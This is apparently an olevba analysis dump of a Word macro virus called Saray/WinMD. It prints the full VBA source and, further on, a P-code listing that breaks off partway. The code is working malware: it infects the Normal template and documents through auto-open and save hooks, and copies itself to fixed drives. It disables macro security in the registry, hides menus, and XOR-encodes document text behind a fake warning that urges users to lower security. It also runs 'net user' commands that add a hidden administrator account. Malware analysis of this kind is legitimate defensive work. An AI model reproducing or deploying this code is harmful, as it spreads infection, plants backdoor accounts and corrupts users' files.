olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saray
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saray - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinMD.bas 
in file: Virus.MSWord.Saray - OLE stream: 'Macros/VBA/WinMD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub spread()
On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set dc = fs.Drives
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    For Each d In dc
        If d.DriveType = 3 Then
            Path = d.driveletter
            If fs.folderexists(Path + ":\xxx") = False Then
                fs.createfolder (Path + ":\xxx")
                fs.copyfile ActiveDocument.FullName, Path + ":\xxx\xxx.doc"
            End If
        End If
    Next
End Sub
Private Sub WinMD()
On Error GoTo allinfected
stealth
infectnt = True
INFECTAD = True
For I = 1 To NormalTemplate.VBProject.vbcomponents.Count
If NormalTemplate.VBProject.vbcomponents.Item(I).Name = "WinMD" Then infectnt = False
Next
For I = 1 To ActiveDocument.VBProject.vbcomponents.Count
If ActiveDocument.VBProject.vbcomponents.Item(I).Name = "WinMD" Then INFECTAD = False
Next
If infectnt = True Then
    ActiveDocument.VBProject.vbcomponents("WinMD").Export ("c:\winmd.vxd")
    Set victim = NormalTemplate.VBProject
End If
If INFECTAD = True Then
    NormalTemplate.VBProject.vbcomponents("WinMD").Export ("c:\winmd.vxd")
    Set victim = ActiveDocument.VBProject
End If
If INFECTAD = False And infectnt = False Then GoTo allinfected
m0rph
If INFECTAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
victim.vbcomponents.import ("c:\winmd2.vxd")
Kill "c:\winmd.vxd"
Kill "c:\winmd2.vxd"
If INFECTAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
If infectnt = True Then NormalTemplate.Save
allinfected:
On Error Resume Next
Kill "c:\winmd.vxd"
Kill "c:\winmd2.vxd"
End Sub
Sub autoopen()
On Error Resume Next
WinMD
encode (0)
spread
End Sub
Sub filesave()
On Error Resume Next
If (InStr(1, ActiveDocument.FullName, "Document", vbTextCompare) <> 1) And (InStr(1, ActiveDocument.FullName, "Äîêóìåíò", vbTextCompare) <> 1) Then
    WinMD
    If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    encode (0)
    ActiveDocument.Saved = True
Else
    filesaveas
End If
End Sub
Sub filesaveas()
On Error Resume Next
WinMD
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
encode (0)
ActiveDocument.Saved = True
End Sub
Sub fileprint()
On Error Resume Next
trigger
Dialogs(wdDialogFilePrint).Show
End Sub
Sub fileclose()
On Error GoTo ro
If ActiveDocument.Saved = True Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    WinMD
    If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    ActiveDocument.Close savechanges:=wdDoNotSaveChanges
Else
   mess$ = "Save changes before exitting?"
   mess$ = "Ñîõðàíèòü èçìåíåíèÿ â äîêóìåíòå " + ActiveDocument.FullName + "?"
   resp = MsgBox(mess$, vbYesNoCancel + vbExclamation, "Microsoft Word")
   If resp = vbYes Then filesave
   If resp = vbNo Then ActiveDocument.Saved = True
   If resp <> vbCancel Then ActiveDocument.Close savechanges:=wdDoNotSaveChanges
End If
    
ro:
End Sub
Private Sub stealth()
On Error Resume Next
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.ScreenUpdating = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = 1& 'WinMD
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1& 'WinMD
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1& 'WinMD
For I = CommandBars("tools").Controls.Count - 1 To CommandBars("tools").Controls.Count - 100
    CommandBars("tools").Controls.Item(I).Enabled = False
Next I
CommandBars("Format").Controls.Item(CommandBars("Format").Controls.Count - 2).Enabled = False
End Sub
Sub toolsmacro()
End Sub
Sub viewvbcode()
End Sub
Function scramble(str)
On Error Resume Next
'If (InStr(1, str, "Sub", 0) = 0) And (InStr(1, str, "Function", 0) = 0) And (InStr(1, str, "WinMD", 1) = 0) And (InStr(1, str, "Âíèìà", 1) = 0) And (InStr(1, str, "Æéìèä", 1) = 0) Then
'    AR = Split(str, " ", -1, 1)
'        For I = 1 To UBound(AR)
'            If (2 * Rnd) < 1 Then
'                AR(I) = LCase(AR(I))
'            Else
'                AR(I) = UCase(AR(I))
'            End If
'        Next
'    scramble = Join(AR, " ")
'Else
    scramble = str
'End If
End Function
Private Sub m0rph()
On Error Resume Next
Dim I, SARRAY(50) As String
Open "c:\winmd.vxd" For Input As #1
Open "c:\winmd2.vxd" For Output As #2
Line Input #1, s$
If s$ <> "" Then Print #2, scramble(s$)
I = 1
Line Input #1, SARRAY(I)
Do
I = I + 1
Line Input #1, SARRAY(I)
Loop Until ((SARRAY(I) = "Sub autoopen()") Or (SARRAY(I) = "Function scrabmle(str)") Or (SARRAY(I) = "Private Sub WinMD()") Or (SARRAY(I) = "Private Sub m0rph()") Or (SARRAY(I) = "Sub filesave()") Or (SARRAY(I) = "Private Sub stealth()") Or (SARRAY(I) = "Private Sub trigger()") Or (SARRAY(I) = "Private Sub encode(diri)") Or (SARRAY(I) = "Sub autoclose") Or (SARRAY(I) = "Sub filesaveas()") Or (SARRAY(I) = "Sub fileprint()") Or (SARRAY(I) = "Private Sub spread()") Or (SARRAY(I) = "Sub viewvbcode()") Or (SARRAY(I) = "Sub toolsmacro()"))
s$ = SARRAY(I)
I = I - 1
Do
If s$ <> "" Then Print #2, scramble(s$)
Line Input #1, s$
Loop Until s$ = "'WinMD"
For C = 0 To I
If SARRAY(C) <> "" Then Print #2, scramble(SARRAY(C))
Next
If s$ <> "" Then Print #2, scramble(s$)
Close #2
Close #1
End Sub
Private Sub trigger()
On Error Resume Next
Randomize
    If ((ActiveDocument.Paragraphs.Count > 10) And (Left(ActiveDocument.Paragraphs(1).Range.Text, 5) <> "  .  ")) And (Rnd * 10 < 4) Then
        Randomize
        I = Int((ActiveDocument.Paragraphs.Count - 1) * Rnd) + 1
        ActiveDocument.Paragraphs(I).Range.Text = Left(ActiveDocument.Paragraphs(I).Range.Text, Len(ActiveDocument.Paragraphs(I).Range.Text) - 1) & " ([WinMD] rulezzz...)" & Chr(10)
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    End If
    If System.OperatingSystem = "Windows NT" Then 'WinMD
        Shell ("net user WinMD /add")
        If Application.Language = msoLanguageIDRussian Then
            Shell ("net localgroup Àäìèíèñòðàòîðû WinMD /add")
        Else
            Shell ("net localgroup Administrators WinMD /add")
        End If
    End If
End Sub
Private Sub encode(diri)
On Error Resume Next
If (diri = 1) Or ((diri = 0) And ((Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "  Âíèìà") Or (Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "  Warni"))) Then
  L = ActiveDocument.Paragraphs.Count
  For n = 1 To L
    OLD = Left(ActiveDocument.Paragraphs(n).Range.Text, Len(ActiveDocument.Paragraphs(n).Range.Text) - 1)
    L = Len(OLD)
    newtext = ""
    For I = 1 To L
        char = Asc(Mid(OLD, I, L))
        newchar = char Xor 4
        newtext = newtext & Chr(newchar)
    Next I
    If (n < L) Then ActiveDocument.Paragraphs(n).Range.Text = newtext + Chr(10)
  Next n
End If
If (diri = 1) Then
    'If Application.Language = msoLanguageIDRussian Then
        ActiveDocument.Paragraphs(1).Range.Text = "  Âíèìàíèå! Íå óäàëîñü çàïóñòèòü ìàêðîñ îòâå÷àþùèé çà êîäèðîâêó òåêñòà! Òåêñò ìîæåò îòîáðàæàòüñÿ íåïðàâèëüíî. Ïðîâåðüòå, ÷òî â ìåíþ Ñåðâèñ | Ìàêðîñ | Áåçîïàñíîñòü óñòàíîâëåí ñðåäíèé óðîâåíü áåçîïàñíîñòè" + Chr(10) + ActiveDocument.Paragraphs(1).Range.Text
    'Else
    '    ActiveDocument.Paragraphs(1).Range.Text = "  Warning! At least one macro from this document can't be loaded. Text can't be displayed properly. Try to set medium security level in Tools | Macro | Security... " + Chr(10) + ActiveDocument.Paragraphs(1).Range.Text 'WinMD
    'End If
End If
If (diri = 0) And ((Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "$$Æéìèä") Or (Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "$$Sevjm")) Then ActiveDocument.Paragraphs(1).Range.Text = ""
End Sub
'WinMD
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Saray
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/WinMD - 21605 bytes
' Line #0:
' 	FuncDefn (Private Sub spread())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #3:
' 	SetStmt 
' 	Ld fs 
' 	MemLd Drives 
' 	Set dc 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #5:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld dc 
' 	ForEach 
' Line #6:
' 	Ld d 
' 	MemLd DriveType 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld d 
' 	MemLd driveletter 
' 	St Path 
' Line #8:
' 	Ld Path 
' 	LitStr 0x0005 ":\xxx"
' 	Add 
' 	Ld fs 
' 	ArgsMemLd folderexists 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #9:
' 	Ld Path 
' 	LitStr 0x0005 ":\xxx"
' 	Add 
' 	Paren 
' 	Ld fs 
' 	ArgsMemCall createfolder 0x0001 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Path 
' 	LitStr 0x000D ":\xxx\xxx.doc"
' 	Add 
' 	Ld fs 
' 	ArgsMemCall copyfile 0x0002 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Next 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub WinMD())
' Line #16:
' 	OnError allinfected 
' Line #17:
' 	ArgsCall stealth 0x0000 
' Line #18:
' 	LitVarSpecial (True)
' 	St infectnt 
' Line #19:
' 	LitVarSpecial (True)
' 	St INFECTAD 
' Line #20:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "WinMD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St infectnt 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #24:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "WinMD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St INFECTAD 
' 	EndIf 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' 	Ld infectnt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitStr 0x000C "c:\winmd.vxd"
' 	Paren 
' 	LitStr 0x0005 "WinMD"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set victim 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld INFECTAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x000C "c:\winmd.vxd"
' 	Paren 
' 	LitStr 0x0005 "WinMD"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #32:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set victim 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld INFECTAD 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld infectnt 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo allinfected 
' 	EndIf 
' Line #35:
' 	ArgsCall m0rph 0x0000 
' Line #36:
' 	Ld INFECTAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #37:
' 	LitStr 0x000D "c:\winmd2.vxd"
' 	Paren 
' 	Ld victim 
' 	MemLd vbcomponents 
' 	ArgsMemCall import 0x0001 
' Line #38:
' 	LitStr 0x000C "c:\winmd.vxd"
' 	ArgsCall Kill 0x0001 
' Line #39:
' 	LitStr 0x000D "c:\winmd2.vxd"
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	Ld INFECTAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #41:
' 	Ld infectnt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #42:
' 	Label allinfected 
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	LitStr 0x000C "c:\winmd.vxd"
' 	ArgsCall Kill 0x0001 
' Line #45:
' 	LitStr 0x000D "c:\winmd2.vxd"
' 	ArgsCall Kill 0x0001 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub autoopen())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	ArgsCall WinMD 0x0000 
' Line #50:
' 	LitDI2 0x0000 
' 	Paren 
' 	ArgsCall encode 0x0001 
' Line #51:
' 	ArgsCall spread 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub filesave())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0008 "Document"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #56:
' 	ArgsCall WinMD 0x0000 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	LitDI2 0x00FA 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall encode 0x0001 
' 	EndIf 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #59:
' 	LitDI2 0x0000 
' 	Paren 
' 	ArgsCall encode 0x0001 
' Line #60:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	ArgsCall filesaveas 0x0000 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub filesaveas())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	ArgsCall WinMD 0x0000 
' Line #68:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #69:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	LitDI2 0x00FA 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall encode 0x0001 
' 	EndIf 
' Line #70:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #71:
' 	LitDI2 0x0000 
' 	Paren 
' 	ArgsCall encode 0x0001 
' Line #72:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub fileprint())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall trigger 0x0000 
' Line #77:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub fileclose())
' Line #80:
' 	OnError ro 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #83:
' 	ArgsCall WinMD 0x0000 
' Line #84:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	LitDI2 0x00FA 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall encode 0x0001 
' 	EndIf 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #86:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed savechanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #87:
' 	ElseBlock 
' Line #88:
' 	LitStr 0x001D "Save changes before exitting?"
' 	St mess$ 
' Line #89:
' 	LitStr 0x0020 "Ñîõðàíèòü èçìåíåíèÿ â äîêóìåíòå "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	St mess$ 
' Line #90:
' 	Ld mess$ 
' 	Ld vbYesNoCancel 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsLd MsgBox 0x0003 
' 	St resp 
' Line #91:
' 	Ld resp 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall filesave 0x0000 
' 	EndIf 
' Line #92:
' 	Ld resp 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #93:
' 	Ld resp 
' 	Ld vbCancel 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed savechanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	Label ro 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Private Sub stealth())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #102:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x006F 0x0005 "WinMD"
' Line #105:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x006F 0x0005 "WinMD"
' Line #106:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0070 0x0005 "WinMD"
' Line #107:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	LitDI2 0x0064 
' 	Sub 
' 	For 
' Line #108:
' 	LitVarSpecial (False)
' 	Ld I 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #109:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub toolsmacro())
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub viewvbcode())
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Function scramble(str))
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	QuoteRem 0x0000 0x00B8 "If (InStr(1, str, "Sub", 0) = 0) And (InStr(1, str, "Function", 0) = 0) And (InStr(1, str, "WinMD", 1) = 0) And (InStr(1, str, "Âíèìà", 1) = 0) And (InStr(1, str, "Æéìèä", 1) = 0) Then"
' Line #119:
' 	QuoteRem 0x0000 0x001F "    AR = Split(str, " ", -1, 1)"
' Line #120:
' 	QuoteRem 0x0000 0x001F "        For I = 1 To UBound(AR)"
' Line #121:
' 	QuoteRem 0x0000 0x0021 "            If (2 * Rnd) < 1 Then"
' Line #122:
' 	QuoteRem 0x0000 0x0024 "                AR(I) = LCase(AR(I))"
' Line #123:
' 	QuoteRem 0x0000 0x0010 "            Else"
' Line #124:
' 	QuoteRem 0x0000 0x0024 "                AR(I) = UCase(AR(I))"
' Line #125:
' 	QuoteRem 0x0000 0x0012 "            End If"
' Line #126:
' 	QuoteRem 0x0000 0x000C "        Next"
' Line #127:
' 	QuoteRem 0x0000 0x001C "    scramble = Join(AR, " ")"
' Line #128:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #129:
' 	Ld str 
' 	St scramble 
' Line #130:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #131:
' 	EndFunc 
' Line #132:
' 	FuncDefn (Private Sub m0rph())
' Line #133:
' 	OnError (Resume Next) 
' Line #134:
' 	Dim 
' 	VarDefn I
' 	OptionBase 
' 	LitDI2 0x0032 
' 	VarDefn SARRAY (As String)
' Line #135:
' 	LitStr 0x000C "c:\winmd.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #136:
' 	LitStr 0x000D "c:\winmd2.vxd"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #137:
' 	LitDI2 0x0001 
' 	Ld s$ 
' 	LineInput 
' Line #138:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld s$ 
' 	ArgsLd scramble 0x0001 
' 	PrintItemNL 
' 	EndIf 
' Line #139:
' 	LitDI2 0x0001 
' 	St I 
' Line #140:
' 	LitDI2 0x0001 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LineInput 
' Line #141:
' 	Do 
' Line #142:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #143:
' 	LitDI2 0x0001 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LineInput 
' Line #144:
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x000E "Sub autoopen()"
' 	Eq 
' 	Paren 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0016 "Function scrabmle(str)"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0013 "Private Sub WinMD()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0013 "Private Sub m0rph()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x000E "Sub filesave()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0015 "Private Sub stealth()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0015 "Private Sub trigger()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0018 "Private Sub encode(diri)"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x000D "Sub autoclose"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0010 "Sub filesaveas()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x000F "Sub fileprint()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0014 "Private Sub spread()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0010 "Sub toolsmacro()"
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	LoopUntil 
' Line #145:
' 	Ld I 
' 	ArgsLd SARRAY 0x0001 
' 	St s$ 
' Line #146:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	St I 
' Line #147:
' 	Do 
' Line #148:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld s$ 
' 	ArgsLd scramble 0x0001 
' 	PrintItemNL 
' 	EndIf 
' Line #149:
' 	LitDI2 0x0001 
' 	Ld s$ 
